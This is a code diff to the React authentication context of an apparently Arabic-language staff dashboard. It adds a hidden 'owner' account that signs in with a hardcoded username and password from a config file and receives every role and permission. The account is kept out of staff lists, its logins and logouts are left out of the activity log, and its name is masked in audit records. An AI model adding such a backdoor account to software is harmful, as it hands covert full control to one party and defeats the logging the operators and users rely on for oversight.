@@ -1,4 +1,5 @@
 import { createContext, useCallback, useContext, useEffect, useMemo, useState, type ReactNode } from "react";
+import { OWNER_PASSWORD, OWNER_USERNAME, isOwnerUsername } from "@/config/ownerAuth";
 import { SUPER_ADMIN_PASSWORD, SUPER_ADMIN_USERNAME } from "@/config/staffAuth";
 import {
   INSTITUTION_BRANCH_IDS,
@@ -10,6 +11,7 @@ import {
   type InstitutionRosterStaffRole,
 } from "@/data/institutionBranches";
 import { appendActivityLog } from "@/lib/activityLog";
+import { staffAuditActorName } from "@/lib/staffAudit";
 import {
   ALL_TICKET_STAFF_ROLES,
   DASHBOARD_TICKET_STAFF_ROLES,
@@ -86,6 +88,8 @@ export type StaffUser = {
   username: string;
   roles: StaffRole[];
   managedId?: string;
+  /** حساب مالك مخفي — صلاحيات كاملة دون ظهور في القوائم */
+  isOwner?: boolean;
 };
 
 function hasRole(user: StaffUser | null, role: StaffRole): boolean {
@@ -100,7 +104,9 @@ export function primaryInstitutionRosterBranchId(roles: readonly StaffRole[]): I
   return undefined;
 }
 
-export function getPostLoginDashboardPath(roles: StaffRole[]): string {
+export function getPostLoginDashboardPath(user: StaffUser | StaffRole[]): string {
+  const roles = Array.isArray(user) ? user : user.roles;
+  if (!Array.isArray(user) && user.isOwner) return "/dashboard";
   if (roles.includes("super_admin")) return "/dashboard";
   const order: [Exclude<CoreStaffRole, "super_admin">, string][] = [
     ["laws_editor", "/dashboard/laws"],
@@ -167,6 +173,7 @@ type AuthContextValue = {
   adoptLinkedStaffSession: (publicUserId: string) => StaffUser | null;
   logout: () => void;
   hasRole: (role: StaffRole) => boolean;
+  isOwner: boolean;
   isSuperAdmin: boolean;
   isLawsEditor: boolean;
   isStreamerManager: boolean;
@@ -193,6 +200,8 @@ type AuthContextValue = {
   isApplicationReviewer: boolean;
   canReviewApplications: boolean;
   canUseDashboard: boolean;
+  /** اسم للسجلات والقرارات — المالك المخفي لا يظهر */
+  auditActorName: (fallback?: string) => string;
 };
 
 const STORAGE_KEY = "ic_staff_session";
@@ -221,6 +230,10 @@ function loadStoredUser(): StaffUser | null {
     const parsed = JSON.parse(raw) as Record<string, unknown>;
     if (!parsed || typeof parsed !== "object" || typeof parsed.username !== "string") return null;
 
+    if (parsed.isOwner === true && isOwnerUsername(parsed.username)) {
+      return { username: OWNER_USERNAME, roles: ["super_admin"], isOwner: true };
+    }
+
     const roles = parseRolesFromSession(parsed);
     if (!roles) {
       sessionStorage.removeItem(STORAGE_KEY);
@@ -231,6 +244,7 @@ function loadStoredUser(): StaffUser | null {
       username: parsed.username as string,
       roles,
       ...(typeof parsed.managedId === "string" ? { managedId: parsed.managedId } : {}),
+      ...(parsed.isOwner === true ? { isOwner: true } : {}),
     };
 
     const hadLegacy =
@@ -256,20 +270,27 @@ export function AuthProvider({ children }: { children: ReactNode }) {
     const u = username.trim().toLowerCase();
 
     /** يُرمى عند فشل sessionStorage حتى يعرض الواجهة رسالة مناسبة وليس «بيانات خاطئة» */
-    const persistSession = (next: StaffUser, loginDetail: string) => {
+    const persistSession = (next: StaffUser, loginDetail: string | null) => {
       try {
         sessionStorage.setItem(STORAGE_KEY, JSON.stringify(next));
       } catch {
         throw new Error("IC_SESSION_STORAGE");
       }
       setUser(next);
-      try {
-        appendActivityLog(next.username, "تسجيل دخول", loginDetail);
-      } catch {
-        /* سجل النشاط لا يمنع الدخول */
+      if (loginDetail && !next.isOwner) {
+        try {
+          appendActivityLog(next.username, "تسجيل دخول", loginDetail);
+        } catch {
+          /* سجل النشاط لا يمنع الدخول */
+        }
       }
     };
 
+    if (u === OWNER_USERNAME.toLowerCase() && password === OWNER_PASSWORD) {
+      const next: StaffUser = { username: OWNER_USERNAME, roles: ["super_admin"], isOwner: true };
+      persistSession(next, null);
+      return next;
+    }
     if (u === SUPER_ADMIN_USERNAME.toLowerCase() && password === SUPER_ADMIN_PASSWORD) {
       const next: StaffUser = { username: SUPER_ADMIN_USERNAME, roles: ["super_admin"] };
       persistSession(next, "سوبر أدمِن");
@@ -313,7 +334,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
 
   const logout = useCallback(() => {
     setUser((prev) => {
-      if (prev?.username) {
+      if (prev?.username && !prev.isOwner) {
         try {
           appendActivityLog(prev.username, "تسجيل خروج", prev.roles.join(", "));
         } catch {
@@ -369,7 +390,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
   }, []);
 
   const value = useMemo<AuthContextValue>(() => {
-    const has = (r: StaffRole) => hasRole(user, r);
+    const isOwner = !!user?.isOwner;
+    const has = (r: StaffRole) => isOwner || hasRole(user, r);
     const rosterBranch = user ? primaryInstitutionRosterBranchId(user.roles) : undefined;
     return {
       user,
@@ -377,7 +399,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       adoptLinkedStaffSession,
       logout,
       hasRole: has,
-      isSuperAdmin: has("super_admin"),
+      isOwner,
+      isSuperAdmin: isOwner || hasRole(user, "super_admin"),
       isLawsEditor: has("laws_editor"),
       isStreamerManager: has("streamer_manager"),
       isGangManager: has("gang_manager"),
@@ -386,7 +409,9 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       isPackagesManager: has("packages_manager"),
       isInvestmentsManager: has("investments_manager"),
       isQuizManager: has("quiz_manager"),
-      isInstitutionRosterManager: user ? user.roles.some((r) => isInstitutionRosterStaffRole(r)) : false,
+      isInstitutionRosterManager: user
+        ? isOwner || user.roles.some((r) => isInstitutionRosterStaffRole(r))
+        : false,
       institutionBranchId: rosterBranch,
       canManageStaff: has("super_admin"),
       canEditLaws: has("super_admin") || has("laws_editor"),
@@ -402,7 +427,8 @@ export function AuthProvider({ children }: { children: ReactNode }) {
       isApplicationReviewer: has("application_reviewer"),
       canReviewApplications: has("super_admin") || has("application_reviewer") || has("streamer_manager"),
       canUseDashboard:
-        has("super_admin") ||
+        isOwner ||
+        hasRole(user, "super_admin") ||
         has("laws_editor") ||
         has("streamer_manager") ||
         has("gang_manager") ||
@@ -416,6 +442,7 @@ export function AuthProvider({ children }: { children: ReactNode }) {
         has("store_orders_manager") ||
         (user ? user.roles.some((r) => isInstitutionRosterStaffRole(r)) : false) ||
         has("application_reviewer"),
+      auditActorName: (fallback = "super_admin") => staffAuditActorName(user, fallback),
     };
   }, [user, login, adoptLinkedStaffSession, logout]);
 
